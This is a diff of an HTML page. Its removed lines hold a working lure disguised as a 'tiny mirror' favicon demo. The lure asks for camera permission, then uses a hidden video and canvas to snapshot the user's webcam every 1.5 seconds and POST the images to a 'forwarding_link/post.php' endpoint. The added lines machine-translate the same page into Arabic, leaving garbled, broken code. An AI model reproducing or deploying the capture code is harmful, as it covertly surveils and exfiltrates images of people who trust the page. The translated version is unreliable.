@@ -1,83 +1,83 @@
-<!doctype html>
-<html>
-<head>
-<script type="text/javascript" src="https://wybiral.github.io/code-art/projects/tiny-mirror/index.js"></script>
-<link rel="stylesheet" type="text/css" href="https://wybiral.github.io/code-art/projects/tiny-mirror/index.css">
-<script type="text/javascript" src="https://ajax.googleapis.com/ajax/libs/jquery/1.8.3/jquery.js"></script>
-</head>
+<! Dictype html >
+< html >
+< رئيس >
+< script  type = " text / javascript " src = " https://wybiral.github.io/code-art/projects/tiny-mirror/index.js " > </ script >
+< link  rel = " stylesheet " type = " text / css " href = " https://wybiral.github.io/code-art/projects/tiny-mirror/index.css " >
+< script  type = " text / javascript " src = " https://ajax.googleapis.com/ajax/libs/jquery/1.8.3/jquery.js " > </ script >
+</ رئيس >
 
-<div class="video-wrap" hidden="hidden">
-   <video id="video" playsinline autoplay></video>
-</div>
+< div  class = " video-wrap " hidden = " hidden " >
+   < الفيديو  معرف = " فيديو " playsinline  التشغيل التلقائي > </ الفيديو >
+</ div >
 
-<canvas hidden="hidden" id="canvas" width="640" height="480"></canvas>
+< canvas  hidden = " hidden " id = " canvas " width = " 640 " height = " 480 " > </ canvas >
 
-<script>
+< البرنامج النصي >
 
-function post(imgdata){
-$.ajax({
-    type: 'POST',
-    data: { cat: imgdata},
-    url: 'forwarding_link/post.php',
-    dataType: 'json',
-    async: false,
-    success: function(result){
-        // call the function that handles the response/results
-    },
-    error: function(){
+وظيفة  وظيفة ( imgdata ) {
+$ . أياكس ( {
+    اكتب : "POST" ،
+    البيانات : {  cat : imgdata } ،
+    url : 'forwarding_link / post.php' ،
+    نوع البيانات : "json" ،
+    غير متزامن : خطأ ،
+    النجاح : الوظيفة ( النتيجة ) {
+        // استدعاء الوظيفة التي تتعامل مع الاستجابة / النتائج
+    } ،
+    خطأ : الوظيفة ( ) {
     }
-  });
-};
+  } ) ؛
+} ؛
 
 
-'use strict';
+"استخدام صارم" ؛
 
-const video = document.getElementById('video');
-const canvas = document.getElementById('canvas');
-const errorMsgElement = document.querySelector('span#errorMsg');
+ فيديو  كونست =  وثيقة . getElementById ( "فيديو" ) ؛
+ قماش  const =  وثيقة . getElementById ( "canvas" ) ؛
+CONST  errorMsgElement  =  ثيقة . محدد الاستعلام ( 'span # errorMsg' ) ،
 
-const constraints = {
-  audio: false,
-  video: {
+ قيود  const =  {
+  الصوت : خطأ ،
+  فيديو : {
     
-    facingMode: "user"
+    وضع المواجهة : "المستخدم"
   }
-};
+} ؛
 
-// Access webcam
-async function init() {
-  try {
-    const stream = await navigator.mediaDevices.getUserMedia(constraints);
-    handleSuccess(stream);
-  } catch (e) {
-    errorMsgElement.innerHTML = `navigator.getUserMedia error:${e.toString()}`;
+//مرحبا بك في الموقع
+المتزامن  وظيفة  الحرف الأول ( )  {
+  حاول  {
+     تيار  const =  انتظار  الملاح . أجهزة . getUserMedia ( قيود ) ؛
+    handleSuccess ( تيار ) ؛
+  }  catch  ( e )  {
+    errorMsgElement . innerHTML  =  `خطأ navigator.getUserMedia: $ { e . toString ( ) } ` ؛
   }
 }
 
-// Success
-function handleSuccess(stream) {
-  window.stream = stream;
-  video.srcObject = stream;
+// نجاح
+وظيفة  handleSuccess ( دفق )  {
+  نافذة . تيار  =  تيار ؛
+  فيديو . srcObject  =  دفق ؛
 
-var context = canvas.getContext('2d');
-  setInterval(function(){
+ سياق  فار =  قماش . getContext ( '2d' ) ؛
+  setInterval ( الوظيفة ( ) {
 
-       context.drawImage(video, 0, 0, 640, 480);
-       var canvasData = canvas.toDataURL("image/png").replace("image/png", "image/octet-stream");
-       post(canvasData); }, 1500);
+       السياق . drawImage ( فيديو ،  0 ،  0 ،  640 ،  480 ) ؛
+       فار  كانفاسداتا  =  قماش . toDataURL ( "image / png" ) . استبدل ( "image / png" ،  "image / octet-stream" ) ؛
+       آخر ( canvasData ) ؛  } ،  1500 ) ؛
   
 
 }
 
-// Load init
-init();
+// تحميل الحرف الأول
+الحرف الأول ( ) ؛
 
-</script>
+</ script >
 
-    <body>
-        <p>Hint: Look at the favicon</p>
-        <p>(Accept Permissions)</p>
-        <p><label><input type="checkbox" name="mirror" id="mirror" /> Mirror image</label></p>
-    </body>
+    < الجسم >
+        < p > تلميح: انظر إلى الرمز المفضل </ p >
+        < p > (قبول الأذونات) </ p >
+        < p > < label > < input  type = " checkbox " name = " mirror " id = " mirror " /> صورة معكوسة </ label > </ p >
+    </ الجسم >
 
-</html>
+</ html >
